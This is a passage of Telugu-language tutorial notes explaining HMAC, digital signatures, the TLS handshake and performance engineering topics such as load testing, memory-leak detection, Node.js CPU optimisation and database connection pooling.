  సర్వర్ మరియు క్లయింట్ ఇద్దరికీ ఒక సీక్రెట్ కీ ముందే తెలుసు అనుకుందాం. క్లయింట్ ఒక మెసేజ్‌తో పాటు దాని HMAC ని కూడా పంపుతాడు. సర్వర్ కూడా తన దగ్గరున్న కీతో ఆ మెసేజ్‌కి HMAC క్రియేట్ చేసి, క్లయింట్ పంపిన HMAC తో మ్యాచ్ చేస్తుందో లేదో చూస్తుంది. మ్యాచ్ అయితే డేటా పక్కా అని అర్థం.
- **Algorithms:** HMAC-SHA256.
- **When to use:** **Webhooks (ఉదా: Razorpay/Stripe పేమెంట్ సక్సెస్ అలర్ట్స్) మరియు JWT (JSON Web Tokens) లలో సైనింగ్ (Signing) లేయర్ కోసం.** \* _Example:_ JWT లోని మూడో పార్ట్ (Signature) ఒక HMAC-SHA256 కోడే. దీనివల్ల హ్యాకర్ టోకెన్ లోపల యూజర్ ఐడీని మారిస్తే, సిగ్నేచర్ మ్యాచ్ అవ్వక సర్వర్ దాన్ని రిజెక్ట్ చేస్తుంది.

---

## 📌 క్విక్ కంపారిజన్ (స్పష్టమైన తేడాలు):

| ఫీచర్                 | Hashing (హ్యాషింగ్)                               | Encryption (ఎన్‌క్రిప్షన్)                         | HMAC                                               |
| --------------------- | ------------------------------------------------- | -------------------------------------------------- | -------------------------------------------------- |
| **రకం**               | One-Way (వెనక్కి రాలేము)                          | Two-Way (వెనక్కి రావచ్చు)                          | One-Way (కానీ కీ అవసరం)                            |
| **తాళం (Key)**        | అవసరం లేదు                                        | కచ్చితంగా కావాలి (Symmetric/Asymmetric)            | ఒక సీక్రెట్ కీ కావాలి                              |
| **ముఖ్య ఉద్దేశం**     | డేటా ఒరిజినాలిటీని, **పాస్‌వర్డ్‌లను** దాచడానికి. | డేటాని ఎవరికీ కనిపించకుండా **రహస్యంగా** ఉంచడానికి. | డేటా **మారలేదు (Integrity)** అని వెరిఫై చేయడానికి. |
| **రియల్ వరల్డ్ యూజ్** | User Passwords (`bcrypt`)                         | Database Storage, HTTPS (`AES/RSA`)                | JWT Signatures, Webhooks                           |

---

క్రిప్టోగ్రఫీ మరియు నెట్‌వర్క్ సెక్యూరిటీ ప్రపంచంలో ఇంటర్నెట్ సురక్షితంగా నడవడానికి అత్యంత ప్రాథమికమైన రెండు పిల్లర్స్ **Digital Signatures** మరియు **TLS (Transport Layer Security)**. మనం రోజువారీ వాడే బ్యాంకింగ్ ట్రాన్సాక్షన్స్ నుండి వాట్సాప్ చాట్స్ వరకు అన్నీ వీటిపైనే ఆధారపడి పని చేస్తాయి.

ఈ రెండింటి వెనుక ఉన్న కాంప్లెక్స్ ఆర్కిటెక్చర్‌ను మన స్టైల్‌లో క్లియర్‌గా, తెలుగులో నేర్చుకుందాం.

---

## 1. Digital Signatures (డిజిటల్ సంతకం)

- **The Core Concept:** రియల్ వరల్డ్ లో ఒక డాక్యుమెంట్ నిజమైనదా కాదా అని చెప్పడానికి మనం చేతితో సంతకం (Signature) పెడతాం. డిజిటల్ ప్రపంచంలో కూడా ఒక ఫైల్ లేదా మెసేజ్ నిజంగానే పంపిన వ్యక్తి (Sender) నుండి వచ్చిందా, మరియు దాన్ని మధ్యలో ఎవరైనా మార్చారా (**Integrity & Authenticity**) అని వెరిఫై చేయడానికి వాడే ఒక క్రిప్టోగ్రాఫిక్ పద్ధతే **Digital Signature**.
- **How it works (Asymmetric Encryption ఆధారంగా):** ఇది పబ్లిక్ మరియు ప్రైవేట్ కీ (Public/Private Key) కాంబినేషన్‌తో పనిచేస్తుంది.

```text
 [ Sender ] ──► (Hash of Message) ──► [ Sign with Private Key ] ──► [ Digital Signature ]
                                                                             │
                                                                       (Sends to Network)
                                                                             │
 [ Receiver ] ──► [ Decrypt with Public Key ] ──► (Compares Hashes) ◄────────┘

```

### 🛠️ స్టెప్-బై-స్టెప్ ప్రాసెస్:

1. **Signing (పంపేటప్పుడు):** సెండర్ తన మెసేజ్‌ను తీసుకొని, మొదట దానికి ఒక హ్యాష్ (`SHA-256`) క్రియేట్ చేస్తాడు. ఆ హ్యాష్‌ని తన **సొంత ప్రైవేట్ కీ (Private Key)** తో ఎన్‌క్రిప్ట్ చేస్తాడు. దాన్నే "డిజిటల్ సిగ్నేచర్" అంటారు. ఆ సిగ్నేచర్‌ను మెసేజ్‌కి అటాచ్ చేసి అవతలి వారికి పంపుతాడు.
2. **Verification (రిసీవ్ చేసుకునేటప్పుడు):** రిసీవర్ ఆ మెసేజ్‌ను మరియు సిగ్నేచర్‌ను తీసుకుంటాడు. సెండర్ యొక్క **పబ్లిక్ కీ (Public Key)** తో ఆ సిగ్నేచర్‌ను డిక్రిప్ట్ చేస్తాడు. అప్పుడు ఒక హ్యాష్ వస్తుంది. ఇప్పుడు మెసేజ్‌కి విడిగా తను కూడా ఒక హ్యాష్ క్రియేట్ చేసి, ఈ రెండు హ్యాష్‌లు మ్యాచ్ అయ్యాయో లేదో చూస్తాడు.

- **Result:** మ్యాచ్ అయితే—మెసేజ్ పంపింది ఖచ్చితంగా ఆ సెండరే (ఎందుకంటే అది అతని ప్రైవేట్ కీతోనే లాక్ అయింది) మరియు మధ్యలో ఎవరూ డేటాని మార్చలేదు అని 100% ప్రూవ్ అవుతుంది (**Non-repudiation**).

---

## 2. TLS (Transport Layer Security - ఇంటర్నెట్ రక్షణ కవచం)

- **What it is:** మనం బ్రౌజర్‌లో చూసే **HTTPS** లోని `S` (Secure) కి కారణం ఈ **TLS** (దీని పాత వెర్షనే SSL). ఇది నెట్‌వర్క్‌లో ప్రయాణించే డేటాని (Data in Transit) హ్యాకర్లు దొంగిలించకుండా ఎన్‌క్రిప్ట్ చేసే ఒక ప్రొటోకాల్.
- **Why it matters:** ఒకవేళ వైఫై లేదా ఇంటర్నెట్ నెట్‌వర్క్ మధ్యలో ఎవరైనా మీ డేటాని స్నిఫ్ (Man-in-the-Middle Attack) చేసినా, TLS వల్లే వారికి మీ పాస్‌వర్డ్‌లు, క్రెడిట్ కార్డ్ వివరాలు కేవలం జంక్ కోడ్ లాగా కనిపిస్తాయి.

### 🤝 TLS Handshake (సర్వర్ మరియు బ్రౌజర్ ఎలా కనెక్ట్ అవుతాయి? - TLS 1.3)

ఒక యూజర్ మీ సైట్‌ని ఓపెన్ చేయగానే, బ్యాక్‌గ్రౌండ్‌లో మిల్లీసెకన్లలో ఒక అద్భుతమైన హాండ్‌షేక్ జరుగుతుంది:

```text
 [ Browser ]                                                   [ Server ]
      │                                                            │
      │ ──► Client Hello (Supported Cipher Suites & Public Key) ──►│
      │                                                            │
      │ ◄── Server Hello (Server Public Key & Digital Certificate) ◄─┤
      │                                                            │
  (Verifies Certificate via CA)                                    │
  (Generates Master Shared Key)                       (Generates Master Shared Key)
      │                                                            │
      └───────────────► [ Encrypted Session Starts! ] ◄────────────┘

```

1. **Client Hello:** బ్రౌజర్ సర్వర్‌కి "హలో, నేను నీతో సెక్యూర్ గా మాట్లాడాలి. నా దగ్గర ఈ క్రిప్టోగ్రాఫిక్ అల్గారిథమ్స్ (Cipher Suites) మరియు నా ఎఫెమెరల్ పబ్లిక్ కీ ఉన్నాయి" అని పంపుతుంది.
2. **Server Hello & Certificate:** సర్వర్ రెస్పాన్స్ ఇస్తూ తన పబ్లిక్ కీని, మరియు తన **Digital Certificate (SSL Certificate)** ని పంపుతుంది. ఈ సర్టిఫికెట్ ని ఒక నమ్మకమైన థర్డ్-పార్టీ సంస్థ (**Certificate Authority - CA** ఉదా: _Let's Encrypt, DigiCert_) డిజిటల్ సిగ్నేచర్ చేసి ఇస్తుంది.
3. **Verification:** బ్రౌజర్ ఆ సర్టిఫికెట్ లోని డిజిటల్ సిగ్నేచర్‌ను వెరిఫై చేసి, సర్వర్ నిజమైనదే (నకిలీ సైట్ కాదు) అని కన్ఫర్మ్ చేసుకుంటుంది.
4. **Key Exchange (Diffie-Hellman):** ఇప్పుడు బ్రౌజర్ మరియు సర్వర్ తమ పబ్లిక్ కీల సహాయంతో, నెట్‌వర్క్‌లో ఎవరికీ తెలియకుండా బ్యాక్‌గ్రౌండ్‌లో ఒక తాత్కాలికమైన **Symmetric Key (Shared Master Secret Key)** ని క్రియేట్ చేసుకుంటాయి.
5. **Encrypted Session:** ఇకపై ఆ సెషన్‌లో బ్రౌజర్ మరియు సర్వర్ మధ్య జరిగే ప్రతి HTTP రిクエスト, రెస్పాన్స్ ఆ సిమెట్రిక్ కీతో అత్యంత వేగంగా ఎన్‌క్రిప్ట్ (AES-256) అయి ప్రయాణిస్తాయి.

---

### 📌 క్విక్ సమ్మరీ (రెండు ముక్కల్లో):

- **Digital Signature:** డేటా పంపిన వ్యక్తి నిజమైనవాడేనా మరియు డేటా మారలేదా అని **సంతకం** ద్వారా వెరిఫై చేస్తుంది.
- **TLS:** డిజిటల్ సిగ్నేచర్స్ మరియు ఎన్‌క్రిప్షన్ రెండింటినీ వాడుకొని, బ్రౌజర్ నుండి సర్వర్‌కి వెళ్లే దారిని **HTTPS** గా మార్చి డేటాని సురక్షితంగా ఉంచుతుంది.

---

# 14: Performance Engineering

సెక్యూరిటీ తర్వాత సిస్టమ్ ఆర్కిటెక్చర్‌లో అత్యంత ప్రాధాన్యత కలిగిన **చాప్టర్ 14: Performance Engineering** కి అడుగుపెట్టాం!

ఒక అప్లికేషన్ ప్రొడక్షన్‌లోకి వెళ్ళాక విపరీతమైన యూజర్ ట్రాఫిక్ వస్తే అది తట్టుకోగలదా, ఎక్కడైనా స్లో అవుతుందా (Bottlenecks), లేదా సర్వర్లు క్రాష్ అయిపోతాయా అని ముందే పరీక్షించి, ఆప్టిమైజ్ చేసే అత్యంత పవర్‌ఫుల్ విభాగం ఇది.

ఇందులోని మూడు ముఖ్యమైన పిల్లర్స్ అయిన **Profiling, Load Testing, మరియు Stress Testing** ల గురించి మన స్టైల్‌లో క్లియర్‌గా, తెలుగులో నేర్చుకుందాం.

---

## 1. Profiling (కోడ్ లోపలి ఎక్స్-రే స్కాన్)

- **The Core Concept:** ప్రొఫైలింగ్ అనేది మీ అప్లికేషన్ రన్ అవుతున్నప్పుడు, అది **CPU, RAM, మరియు నెట్‌వర్క్ వనరులను లైన్-బై-ライン (Line-by-line) ఎలా వాడుకుంటోంది** అని డీప్ గా అనలైజ్ చేసే ఒక ఇన్-లాబ్ టెక్నిక్.
- **Why it's needed:** "నా యాప్ స్లోగా ఉంది" అని క్లౌడ్‌వాచ్ చెప్పగలదు. కానీ "కోడ్‌ లోపల 42వ లైన్ లో ఉన్న లూప్ (Loop) లేదా ఒక కాంప్లెక్స్ Regex వల్ల CPU 100% కి వెళ్తోంది, లేదా ఒక నిర్దిష్టమైన ఆబ్జెక్ట్ డిలీట్ అవ్వకపోవడం వల్ల మెమరీ లీక్ (**Memory Leak**) అవుతోంది" అని కచ్చితంగా పట్టుకునేది ప్రొఫైలింగ్ మాత్రమే.
- **Tools:** \* Node.js లో `node --inspect` లేదా Chrome DevTools.
- జావాలో _JProfiler_ / _VisualVM_.
- ప్రొడక్షన్ లెవెల్ లో _Datadog Continuous Profiler_ లేదా _AWS CodeGuru_.

- **Output:** ఇది మనకు **Flame Graphs** రూపంలో అవుట్‌పుట్‌ని ఇస్తుంది. ఏ ఫంక్షన్ ఎక్కువ సమయం తీసుకుందో ఆ గ్రాఫ్ అంత వెడల్పుగా కనిపిస్తుంది, దాని ద్వారా బగ్‌ని ఈజీగా ఫిక్స్ చేయవచ్చు.

---

## 2. Load Testing (సాధారణ భారాన్ని పరీక్షించడం)

- **The Core Concept:** మీ అప్లికేషన్ పై ప్రొడక్షన్‌లో సాధారణంగా లేదా గరిష్టంగా ఎంత ట్రాఫిక్ వస్తుందని మీరు ఆశిస్తున్నారో (Expected Peak Load)... **అంతే ట్రాఫిక్‌ను ఆర్టిఫిషియల్ గా క్రియేట్ చేసి సిస్టమ్ పర్ఫార్మెన్స్ ని కొలవడం**.
- **The Goal:** సిస్టమ్ యొక్క లాటెన్సీ (Response Time), త్రూపుట్ (Requests per second), మరియు రిసోర్స్ వినియోగం ఎలా ఉందో చూడటం.
- **Scenario:** మీ ఈ-కామర్స్ యాప్‌కి సాధారణంగా నిమిషానికి 5,000 మంది యూజర్లు వస్తారు అనుకుందాం. లోడ్ టెస్టింగ్ టూల్ ద్వారా కచ్చితంగా 5,000 మంది వర్చువల్ యూజర్లని (Concurrent Users) క్రియేట్ చేసి రిక్వెస్ట్‌లు పంపుతాం. యాప్ 200ms లోపే రెస్పాన్స్ ఇస్తోందా లేదా అని చెక్ చేస్తాం.
- **Tools:** **K6** (Modern JavaScript-based), **Apache JMeter** (Classic), **Locust** (Python-based).

---

## 3. Stress Testing (వ్యవస్థను విరగ్గొట్టడం - Breaking Point)

- **The Core Concept:** లోడ్ టెస్టింగ్‌లో మనకు కెపాసిటీ తెలుసు. కానీ స్ట్రెస్ టెస్టింగ్‌లో **"అసలు మన సిస్టమ్ ఎంతవరకు తట్టుకోగలదు, ఎప్పుడు క్రాష్ అవుతుంది (Breaking Point)"** అని తెలుసుకోవడానికి, సిస్టమ్ కెపాసిటీ కంటే రెట్టింపు లేదా ముప్ఫై రెట్లు భారాన్ని ఒకేసారి పెంచడం.
- **The Goal:** 1. సిస్టమ్ ఎక్కడ బ్రేక్ అవుతుందో కనిపెట్టడం.

2. సిస్టమ్ క్రాష్ అయినప్పుడు అది ఎలా ప్రవర్తిస్తుంది? యూజర్లకి `500 Internal Error` ఇస్తుందా లేదా డేటాబేస్ లోని డేటాని కరప్ట్ చేసేస్తుందా?
3. ట్రాఫిక్ మళ్ళీ తగ్గినప్పుడు, సిస్టమ్ మ్యాన్యువల్ హెల్ప్ లేకుండా ఆటోమేటిక్‌గా రీబూట్ అయి నార్మల్ స్థితికి వస్తుందా లేదా (**Graceful Recovery**)?

- **Scenario:** నిమిషానికి 5,000 తట్టుకునే యాప్ పై ఒక్కసారిగా 50,000 మంది యూజర్ల లోడ్ వేయడం (ఉదా: ఫ్లాష్ సేల్ లేదా బ్లాక్ ఫ్రైడే సినారియో).

---

## 📌 క్విక్ కంపారిజన్ (స్పష్టమైన తేడాలు):

| ఫీచర్        | Profiling (ప్రొఫైలింగ్)                           | Load Testing (లోడ్ టెస్టింగ్)                      | Stress Testing (స్ట్రెస్ టెస్టింగ్)                   |
| ------------ | ------------------------------------------------- | -------------------------------------------------- | ----------------------------------------------------- |
| **ఫోకస్**    | **కోడ్ మరియు హార్డ్‌వేర్** లెవెల్ లో (CPU/RAM).   | **అప్లికేషన్ కెపాసిటీ** లెవెల్ లో (Expected Load). | **సిస్టమ్ లిమిట్స్** మరియు స్టెబిలిటీ లెవెల్ లో.      |
| **ఉద్దేశం**  | మెమరీ లీక్స్, స్లో ఫంక్షన్స్ కనిపెట్టడానికి.      | సాధారణ పీక్ ట్రాఫిక్ లో యాప్ వేగాన్ని కొలవడానికి.  | సిస్టమ్ బ్రేకింగ్ పాయింట్ మరియు రికవరీని చూడటానికి.   |
| **ట్రాఫిక్** | ఒకే ఒక్క రిక్వెస్ట్ లేదా తక్కువ లోడ్ తో చూస్తారు. | ఊహించిన గరిష్ట ట్రాఫిక్ (ఉదా: 1x load).            | అపరిమితమైన, ఊహించని భారీ ట్రాఫిక్ (ఉదా: 5x/10x load). |

---

### 📌 పర్ఫార్మెన్స్ ఇంజనీరింగ్ ఫ్లో:

మొదట **Load Testing** చేసి యాప్ నార్మల్ గా ఉందో లేదో చూస్తాం ──► ఆ తర్వాత **Stress Testing** చేసి అది ఎక్కడ క్రాష్ అవుతుందో కనిపెడతాం ──► క్రాష్ అయిన చోట ఏ ఫంక్షన్ వల్ల సమస్య వచ్చిందో తెలుసుకోవడానికి **Profiling** చేసి కోడ్‌ని ఆప్టిమైజ్ చేస్తాం.

---

పర్ఫార్మెన్స్ ఇంజనీరింగ్ (Performance Engineering) ప్రపంచంలో సిస్టమ్‌ను అత్యంత వేగంగా, స్థిరంగా ఉంచడానికి వాడే రెండు మోస్ట్ ఇంపార్టెంట్ అడ్వాన్స్‌డ్ టెక్నిక్స్ **Benchmarking** మరియు **Memory Leak Detection**.

అప్లికేషన్ బిల్డ్ చేసేటప్పుడు ఏ కోడ్ ప్యాటర్న్ లేదా ఏ టెక్నాలజీ వేగంగా పనిచేస్తుందో కొలవడానికి, మరియు ప్రొడక్షన్‌లో సర్వర్లు నెమ్మదిగా ర్యామ్ (RAM) మొత్తం తినేసి క్రాష్ అయిపోకుండా కాపాడటానికి ఇవి ఉపయోగపడతాయి.

వీటిని కూడా మన స్టైల్‌లో క్లియర్‌గా, ప్రాక్టికల్ గా తెలుగులో నేర్చుకుందాం.

---

## 1. Benchmarking (పోలిక మరియు ప్రమాణాల కొలత)

- **The Core Concept:** బెంచ్‌మార్కింగ్ అంటే ఒక నిర్దిష్టమైన కోడ్ స్నిప్పెట్, అల్గారిథమ్, డేటాబేస్ క్వెరీ లేదా పూర్తి సిస్టమ్ యొక్క పర్ఫార్మెన్స్‌ను ఒక ఖచ్చితమైన ప్రమాణంతో కొలిచి పరీక్షించడం.
- **Why it's needed:** "ఏదో ఒక కోడ్ రాయడం" వేరు, "అత్యంత వేగవంతమైన కోడ్ రాయడం" వేరు. ఉదాహరణకు, మీ యాప్‌లో ఒక పెద్ద లూప్‌ని రన్ చేయడానికి జావాస్క్రిప్ట్‌లో `for` లూప్ వాడితే ఫాస్టా, లేక `Array.map()` వాడితే ఫాస్టా? లేదా డేటాబేస్ లో ఇండెక్స్ (Index) పెట్టకముందు క్వెరీ ఎంత స్పీడ్ ఉంది, పెట్టాక ఎంత స్పీడ్ అయింది? అని మిల్లీసెకన్లు లేదా నానోసెకన్ల లెవెల్‌లో కొలిచేదే బెంచ్‌మార్కింగ్.

### 🛠️ రకాలు:

1. **Micro-benchmarking:** కోడ్ లోపల ఉండే చిన్న చిన్న ఫంక్షన్స్ లేదా ఆపరేషన్స్ స్పీడ్‌ని కొలవడం (ఉదా: String concatenation vs Template literals).
2. **Macro-benchmarking:** పూర్తి సిస్టమ్ లేదా ఒక ఏపీఐ ఎండ్-పాయింట్ యొక్క వేగాన్ని కొలవడం.

### 🧰 Tools:

- **Node.js:** `Benchmark.js` లైబ్రరీ లేదా ఇన్‌బిల్ట్ `performance.now()` మెథడ్.
- **Java:** `JMH` (Java Microbenchmark Harness).
- **Go:** గో లాంగ్వేజ్‌లో బై-డిఫాల్ట్ `testing` ప్యాకేజీలోనే బెంచ్‌మార్కింగ్ సపోర్ట్ ఉంటుంది (`go test -bench`).

---

## 2. Memory Leak Detection (మెమరీ లీక్ - నిశ్శబ్ద హంతకుడు)

- **The Core Concept:** సాధారణంగా మీ అప్లికేషన్ రన్ అవుతున్నప్పుడు, దానికి కావలసిన వేరియబుల్స్, ఆబ్జెక్ట్స్ కోసం ర్యామ్ (RAM) లో కొంత మెమరీ అలోకేట్ అవుతుంది. ఆ పని అయిపోయాక, మోడర్న్ లాంగ్వేజెస్‌లో ఉండే **Garbage Collector (GC)** ఆ మెమరీని ఆటోమేటిక్‌గా క్లీన్ చేసేసి ఫ్రీ చేయాలి.
- **The Problem (Memory Leak):** కోడ్‌లో మనం చేసే కొన్ని తప్పుల వల్ల... కొన్ని ఆబ్జెక్ట్స్ అవసరం లేకపోయినా, వాటికి సంబంధించిన రిఫరెన్స్ (Reference) ఎక్కడో ఒకచోట మిగిలిపోతుంది. దీనివల్ల గార్బేజ్ కలెక్టర్ వాటిని డిలీట్ చేయలేదు. సర్వర్ రన్ అయ్యే కొద్దీ ర్యామ్ వినియోగం నిమ్మదిగా పెరుగుతూ (ఉదా: 200MB -> 500MB -> 2GB -> 4GB) చివరకు మెమరీ సరిపోక **`OOM (Out Of Memory) Error`** తో సర్వర్ క్రాష్ అయిపోతుంది.

```text
 [ Normal App ]   ──► [ Uses RAM ] ──► [ Garbage Collector Cleans ] ──► [ RAM Drops back ]
 [ Memory Leak ]  ──► [ Uses RAM ] ──► [ Objects Stays in RAM ]    ──► [ RAM Grows Until CRASH! 💥 ]

```

### ❌ మెమరీ లీక్ రావడానికి ముఖ్య కారణాలు (Common Mistakes):

1. **Accidental Global Variables:** ఫంక్షన్ లోపల `let` లేదా `const` పెట్టకుండా వేరియబుల్ డిక్లేర్ చేస్తే అది గ్లోబల్ వేరియబుల్‌గా మారి సర్వర్ ఆగిపోయే వరకు మెమరీలోనే ఉండిపోతుంది.
2. **Forgotten Timers / Intervals:** `setInterval` లేదా `setTimeout` రన్ చేశాక, పని అయిపోయాక కూడా వాటిని `clearInterval()` చేయకుండా వదిలేయడం.
3. **Event Listeners / Closures:** బ్యాక్‌గ్రౌండ్‌లో ఈవెంట్ లిజనర్స్ ని రిమూవ్ చేయకపోవడం వల్ల అవి మెమరీని పట్టుకునే కూర్చుంటాయి.

### 🛡️ మెమరీ లీక్స్‌ని ఎలా కనిపెట్టాలి (Detection Techniques)?

1. **Heap Snapshot Analysis:**
   మీ యాప్ రన్ అవుతున్నప్పుడు ఒక నిర్దిష్ట సమయంలో మెమరీ స్థితి ఎలా ఉందో ఒక ఫోటో తీయడాన్నే **Heap Snapshot** అంటారు.

- _Process:_ ఒక స్నాప్‌షాట్ తీసి, యాప్ పై కొంచెం లోడ్ వేసి, కాసేపటి తర్వాత రెండో స్నాప్‌షాట్ తీసి రెంటినీ కంపేర్ (Comparison view) చేయాలి. ఏ ఆబ్జెక్ట్స్ డిలీట్ అవ్వకుండా మెమరీలో అలాగే పెరిగిపోతున్నాయో క్లియర్‌గా తెలిసిపోతుంది.

2. **Tools for Detection:**

- **Node.js/Chrome DevTools:** `node --inspect` వాడి క్రోమ్ ప్రొఫైలర్ లో `Memory` ట్యాబ్ ద్వారా హీప్ స్నాప్‌షాట్స్ చూడవచ్చు.
- **Datadog / New Relic:** ప్రొడక్షన్ ఎన్విరాన్‌మెంట్‌లో నిరంతరం మెమరీ గ్రాఫ్‌ను గమనిస్తూ ఉండాలి. గ్రాఫ్ ఎప్పుడూ పైకే వెళ్తూ, ఎక్కడా కిందకి రాకపోతే అక్కడ మెమరీ లీక్ ఉందని అర్థం.

---

### 📌 క్విక్ సమ్మరీ:

- **Benchmarking:** ఏ కోడ్ లేదా ఏ క్వెరీ వేగంగా పనిచేస్తుందో మిల్లీసెకన్లలో కొలిచి, పర్ఫార్మెన్స్ స్టాండర్డ్స్ సెట్ చేయడం.
- **Memory Leak Detection:** అవసరం లేకపోయినా ర్యామ్ లోనే ఉండిపోయి సర్వర్‌ని క్రాష్ చేసే దొంగ ఆబ్జెక్ట్స్ ని ప్రొఫైలింగ్/హీప్ స్నాప్‌షాట్స్ ద్వారా పట్టుకోవడం.

---

పర్ఫార్మెన్స్ ఇంజనీరింగ్ (Performance Engineering) లోని చివరి మరియు మోస్ట్ ప్రాక్టికల్ అడ్వాన్స్‌డ్ టాపిక్స్ ఇవి. ఒక బ్యాకెండ్ సిస్టమ్ మిలియన్ల కొద్దీ రిక్వెస్ట్‌లను తక్కువ ఖర్చుతో, ఎక్కడా హ్యాంగ్ అవ్వకుండా హ్యాండిల్ చేయాలి అంటే... **CPU Utilization** ని ఆప్టిమైజ్ చేయడం మరియు డేటాబేస్ ట్రాఫిక్‌ను కంట్రోల్ చేయడానికి **Connection Pooling** వాడటం అత్యంత ముఖ్యం.

వీటిని కూడా మన స్టైల్‌లో క్లియర్‌గా, రియల్-వరల్డ్ ఆర్కిటెక్చర్ ఎగ్జాంపుల్స్‌తో తెలుగులో నేర్చుకుందాం.

---

## 1. CPU Optimization (సర్వర్ వేగాన్ని పెంచడం)

బ్యాకెండ్ సర్వర్ రన్ అవుతున్నప్పుడు CPU 100% కి వెళ్ళిపోతే, వచ్చే కొత్త రిక్వెస్ట్‌లు క్యూలో ఉండిపోయి యాప్ స్లో అయిపోతుంది లేదా క్రాష్ అవుతుంది. CPU పై భారాన్ని తగ్గించడానికి వాడే బెస్ట్ టెక్నిక్స్ ఇవి:

### ❌ 1. Blocking the Event Loop (Node.js ప్రత్యేకత)

- **The Problem:** Node.js అనేది **Single-Threaded** సిస్టమ్. అంటే ఒకే ఒక దారంతో (Thread) అందరు యూజర్ల రిక్వెస్ట్‌లను హ్యాండిల్ చేస్తుంది. మీరు కోడ్ లోపల ఏదైనా ఒక భారీ కాలిక్యులేషన్ లేదా కాంప్లెక్స్ లూప్ రన్ చేస్తే, ఆ థ్రెడ్ అక్కడ బ్లాక్ అయిపోతుంది. మిగతా యూజర్లందరికీ స్క్రీన్ లోడింగ్ పడుతుంది.
- **The Fix:** భారీ CPU టాస్క్స్ (ఉదా: Image Processing, Cryptography, PDF Generation) ఉంటే వాటిని Event Loop లో రన్ చేయకూడదు. వాటి కోసం **Worker Threads** వాడి వేరే థ్రెడ్‌కి పంపాలి లేదా ఒక విడిగా **Background Queue** (BullMQ/RabbitMQ) కి పుష్ చేసి వేరే వర్కర్ సర్వర్‌లో రన్ చేయాలి.

### 🧵 2. Worker Threads & Clustering (మల్టీ-కోర్ వాడకం)

- **The Concept:** మోడర్న్ సర్వర్లలో 4, 8, లేదా 16 CPU Cores ఉంటాయి. కానీ Node.js బై-డిఫాల్ట్ కేవలం 1 Core మాత్రమే వాడుకుంటుంది. మిగతా Cores అన్నీ ఖాళీగా ఉంటాయి.
- **The Fix:** **Cluster Module** లేదా **PM2 (Process Manager)** వాడటం. మీ సర్వర్‌లో 4 Cores ఉంటే, PM2 మీ యాప్ యొక్క 4 కాపీలను (Instances) బ్యాక్‌గ్రౌండ్‌లో రన్ చేసి, వచ్చే లోడ్‌ని నాలుగింటికీ సమానంగా పంచుతుంది (`pm2 start server.js -i max`). దీనివల్ల మీ సర్వర్ కెపాసిటీ 4 రెట్లు పెరుగుతుంది.

### 📑 3. Avoid Inefficient Code (Regex & Serialization)

- **The Culprits:** చాలా సార్లు కాంప్లెక్స్ Regex (Regular Expressions) వాడటం వల్ల **ReDoS (Regex Denial of Service)** దాడి జరిగి CPU 100% కి వెళ్తుంది. అలాగే చాలా భారీ JSON డేటాని `JSON.parse()` లేదా `JSON.stringify()` చేయడం కూడా CPU కి చాలా భారమైన పని. వీలైనంత వరకు చిన్న డేటా ప్యాకెట్లను వాడటం అలవాటు చేసుకోవాలి.

---

## 2. Connection Pooling (డేటాబేస్ స్నేహ బంధం)

డేటాబేస్ పర్ఫార్మెన్స్ ని పెంచడానికి మరియు సర్వర్ క్రాష్ అవ్వకుండా ఆపడానికి వాడే అత్యంత పవర్‌ఫుల్ ఆర్కిటెక్చరల్ ప్యాటర్న్ ఇది.

### ❌ ద ఓల్డ్ వే (The Problem - No Pooling)

పూలింగ్ లేకపోతే, మీ యాప్‌కి ఒక రిక్వెస్ట్ వచ్చిన ప్రతిసారీ బ్యాకెండ్ కోడ్ ఇలా చేస్తుంది:

1. డేటాబేస్‌కి ఒక కొత్త కనెక్షన్ ఓపెన్ చేస్తుంది (Handshake, Authentication - చాలా స్లో ప్రాసెస్, దాదాపు 50ms పడుతుంది).
2. క్వెరీ రన్ చేసి డేటా తెస్తుంది.
3. కనెక్షన్‌ను క్లోజ్ చేస్తుంది.

**The Catastrophe:** మీ సైట్‌కి ఒక్కసారిగా 2,000 మంది యూజర్లు వస్తే, డేటాబేస్ పై 2,000 కొత్త కనెక్షన్లు ఓపెన్ అవుతాయి. డేటాబేస్ మెమరీ మొత్తం నిండిపోయి **`Too many connections`** ఎర్రర్ ఇచ్చి డేటాబేస్ క్రాష్ అయిపోతుంది.

### 🛡️ ద మోడర్న్ వే (The Solution - Connection Pooling)

- **The Concept:** కనెక్షన్‌ని ప్రతిసారీ ఓపెన్ అండ్ క్లోజ్ చేయకుండా... బ్యాకెండ్ సర్వర్ స్టార్ట్ అయినప్పుడే డేటాబేస్‌తో ఒక 10 లేదా 20 కనెక్షన్లను ముందే ఓపెన్ చేసి ఒక బాక్స్ (**Pool**) లో దాచి ఉంచుతుంది.

```text
  [ Users Traffic ] ──► [ Express Server ]
                              │
                              ▼
                ┌───────────────────────────┐
                │   CONNECTION POOL (📦)     │
                │  [🔗]  [🔗]  [🔗]  [🔗]  [🔗]  │
                └─────────────┬─────────────┘
                              │ (Borrows a connection instantly)
                              ▼
                      [ PostgreSQL / MySQL ]

```

### 🛠️ ఇది ఎలా పనిచేస్తుంది?

1. ఒక రిక్వెస్ట్ రాగానే, పూల్ లో ఖాళీగా ఉన్న ఒక కనెక్షన్‌ని యాప్ **అప్పుగా (Borrow)** తీసుకుంటుంది.
2. క్వెరీ రన్ అవ్వగానే, ఆ కనెక్షన్‌ను క్లోజ్ చేయకుండా... మళ్ళీ తీసుకెళ్లి అదే పూల్ (Box) లో పెట్టేస్తుంది (**Release**).
3. ఒకవేళ 20 కనెక్షన్లు ఆల్రెడీ బిజీగా ఉంటే, 21వ యూజర్ రిక్వెస్ట్ క్రాష్ అవ్వకుండా, ఒక చిన్న క్యూ (Queue) లో వెయిట్ చేస్తుంది. ఒక కనెక్షన్ ఫ్రీ అవ్వగానే దీనికి అందుతుంది.

- **Benefits:** 1. కొత్త కనెక్షన్ క్రియేట్ చేసే టైమ్ (50ms) సేవ్ అవుతుంది, ఏపీఐ సూపర్ ఫాస్ట్ అవుతుంది.

2. మీ డేటాబేస్ పై ఎప్పటికీ లోడ్ కంట్రోల్ లో ఉంటుంది (లిమిట్ దాటదు).

- **Tools:** Node.js లో `pg-pool` (Postgres), `mysql2/promise` (MySQL), లేదా ORMs (`Prisma/Sequelize`) లోపల బై-డిఫాల్ట్ ఈ పూలింగ్ ఆప్షన్స్ ఉంటాయి.

---

## 📌 క్విక్ సమ్మరీ:

